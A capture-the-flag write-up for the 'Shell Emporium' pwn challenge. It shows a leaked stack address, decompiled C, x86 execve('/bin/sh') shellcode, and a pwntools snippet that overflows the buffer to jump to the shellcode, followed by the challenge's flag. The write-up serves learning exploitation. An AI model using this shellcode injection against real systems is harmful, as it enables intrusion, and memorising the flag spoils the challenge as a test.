# Shell Emporium

- **Category:** Pwn  
- **Points:** 180 (1 flag)

## Description
- You see seashells, I see shells.

## Flag
- **Flag 1:** 180 points

## Access
- **Netcat:** `nc chal.ctf-league.damsec.org 1318`
- **Download:** [shell_emporium](http://chal.ctf-league.osusec.org/pwn/shell_emporium/shell_emporium)

## Writeup

### First look
accessing the server shows us this:
```
DEBUG MESSAGE, PLEASE IGNORE: 0xff95147d
Welcome to Sally's Seashell Emporium!
Select a seashell from our sea source:
(1) Soft shell
(2) Smooth shell
(3) Strong shell
(4) Sure shell
```

the debug message looks to be interesting, but we will ignore it for now.

trying to break this program I noticed would happen if we enter a large enough number, but not much was gained from that.

### Disassembling the binary
taking a look at the binary and reverse engineering it

there were a few things of note here

in main, there is a variable that we get the address of, and that address is given to us right off the bat when we connect to the server, this is the debug message we saw earlier.

```c
int32_t main(int32_t argc, char** argv, char** envp)
{
  undefined4 in_ECX;
  undefined local_10f [255];
  int local_10;
  undefined4 local_c;
  
  local_c = in_ECX;
  setbuf(_stdin,(char *)0x0);
  setbuf(_stdout,(char *)0x0);
  printf("DEBUG MESSAGE, PLEASE IGNORE: %p\n",local_10f);
  puts("Welcome to Sally\'s Seashell Emporium!");
  for (local_10 = 0; local_10 < 1; local_10 = local_10 + 1) {
    FUN_080491a2(local_10f + local_10 * 0xff,0xff);
  }
  FUN_080492ce();
  return 0;
}
```

this shows us that the varible is 255 bytes long

### trying to exploit the program

trying to get a foothold onto the system we take a look at just putting our own shellcode in the buffer and trying to execute it

this shellcode can be found on 'sol.py' but below is it copy and pasted

```
mov eax, 0xB
mov ebx, {addr1}
xor ecx, ecx
xor edx, edx
int 0x80
```

essentially what this does is prep the use of a terminal for us to use by pushing the value 0xB into eax, the address of our code into ebx, and then calling the interrupt 0x80 to execute the code

this now has to be put into the buffer, and sending it over to the server

but to actually get a shell we need to push the name of the program we want to run, which is '/bin/sh' 

to do this we then send over the string '/bin/shx00' and then the shellcode, which will get us fully prepped for a shell

then we need to actaully tell the server to execute our code, we accomplish this by sending the address of the buffer we just sent over

```python
p.send(b"/bin/sh\x00")
p.sendline(shellcode)
print(p.recv())
addr2 = p32(addr1+8)
p.sendline(20*addr2)
```

this address is the same as the one we got at the start of the program, but we add 8 to it to get the address of the shellcode

and then we just spam the address it in hopes of overwritting a return address

this resulted in us getting a shell it doesn't take more than 'ls' to find flag.txt and then cat the flag

#### Flag
```
osu{5411y_p0p5_5345h3115_4_7h3_5345h0r3}
```
** I do not own nor did I create the content for this challenge. This is a writeup for the challenge that I solved **
